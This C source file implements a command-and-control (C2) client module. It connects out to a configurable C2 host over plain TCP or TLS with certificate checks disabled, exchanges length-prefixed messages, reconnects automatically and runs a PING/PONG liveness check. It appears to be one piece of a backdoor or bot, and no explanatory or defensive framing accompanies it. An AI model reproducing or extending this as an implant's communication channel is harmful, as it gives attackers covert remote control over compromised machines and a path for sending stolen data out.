#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>
#include <time.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

static int c2_socket = -1;
static char c2_host[256] = {0};
static int c2_port = 0;
static int reconnect_attempts = 0;
static SSL_CTX *ssl_ctx = NULL;
static SSL *ssl = NULL;
static int use_ssl = 0;

int init_ssl() {
    SSL_library_init();
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();
    
    ssl_ctx = SSL_CTX_new(TLS_client_method());
    if (!ssl_ctx) return 0;
    
    SSL_CTX_set_options(ssl_ctx, SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3);
    SSL_CTX_set_verify(ssl_ctx, SSL_VERIFY_NONE, NULL);
    
    return 1;
}

int connect_c2(const char *host, int port, int ssl_enabled) {
    strncpy(c2_host, host, sizeof(c2_host) - 1);
    c2_port = port;
    use_ssl = ssl_enabled;
    
    if (ssl_enabled && !ssl_ctx) {
        if (!init_ssl()) return 0;
    }
    
    struct hostent *server = gethostbyname(host);
    if (!server) return 0;
    
    c2_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (c2_socket < 0) return 0;
    
    int reuse = 1;
    setsockopt(c2_socket, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    
    struct timeval tv;
    tv.tv_sec = 5;
    tv.tv_usec = 0;
    setsockopt(c2_socket, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(c2_socket, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    memcpy(&server_addr.sin_addr, server->h_addr, server->h_length);
    
    if (connect(c2_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        close(c2_socket);
        c2_socket = -1;
        return 0;
    }
    
    if (ssl_enabled) {
        ssl = SSL_new(ssl_ctx);
        SSL_set_fd(ssl, c2_socket);
        if (SSL_connect(ssl) <= 0) {
            SSL_free(ssl);
            ssl = NULL;
            close(c2_socket);
            c2_socket = -1;
            return 0;
        }
    }
    
    reconnect_attempts = 0;
    return 1;
}

int send_to_c2(const void *data, size_t len) {
    if (c2_socket < 0) {
        if (reconnect_attempts < 5) {
            reconnect_attempts++;
            if (connect_c2(c2_host, c2_port, use_ssl)) {
                return send_to_c2(data, len);
            }
        }
        return 0;
    }
    
    uint32_t len_net = htonl(len);
    ssize_t sent = 0;
    
    if (use_ssl && ssl) {
        if (SSL_write(ssl, &len_net, sizeof(len_net)) != sizeof(len_net)) {
            goto error;
        }
        sent = SSL_write(ssl, data, len);
        if (sent != (ssize_t)len) goto error;
    } else {
        if (write(c2_socket, &len_net, sizeof(len_net)) != sizeof(len_net)) {
            goto error;
        }
        sent = write(c2_socket, data, len);
        if (sent != (ssize_t)len) goto error;
    }
    
    return 1;
    
error:
    close(c2_socket);
    c2_socket = -1;
    if (ssl) {
        SSL_free(ssl);
        ssl = NULL;
    }
    return 0;
}

int recv_from_c2(void *buffer, size_t buflen) {
    if (c2_socket < 0) return -1;
    
    uint32_t len_net;
    ssize_t received = 0;
    
    if (use_ssl && ssl) {
        if (SSL_read(ssl, &len_net, sizeof(len_net)) != sizeof(len_net)) {
            goto error;
        }
        received = SSL_read(ssl, buffer, buflen < ntohl(len_net) ? buflen : ntohl(len_net));
        if (received <= 0) goto error;
    } else {
        if (read(c2_socket, &len_net, sizeof(len_net)) != sizeof(len_net)) {
            goto error;
        }
        received = read(c2_socket, buffer, buflen < ntohl(len_net) ? buflen : ntohl(len_net));
        if (received <= 0) goto error;
    }
    
    return received;
    
error:
    close(c2_socket);
    c2_socket = -1;
    if (ssl) {
        SSL_free(ssl);
        ssl = NULL;
    }
    return -1;
}

int check_c2_alive() {
    if (c2_socket < 0) return 0;
    
    const char *ping = "PING";
    if (!send_to_c2(ping, 4)) return 0;
    
    char response[16];
    int ret = recv_from_c2(response, sizeof(response) - 1);
    if (ret <= 0) return 0;
    
    response[ret] = '\0';
    return strcmp(response, "PONG") == 0;
}

void reconnect_c2() {
    if (c2_socket >= 0) {
        close(c2_socket);
        c2_socket = -1;
        if (ssl) {
            SSL_free(ssl);
            ssl = NULL;
        }
    }
    
    connect_c2(c2_host, c2_port, use_ssl);
}

void close_c2_connection() {
    if (ssl) {
        SSL_shutdown(ssl);
        SSL_free(ssl);
        ssl = NULL;
    }
    if (c2_socket >= 0) {
        close(c2_socket);
        c2_socket = -1;
    }
}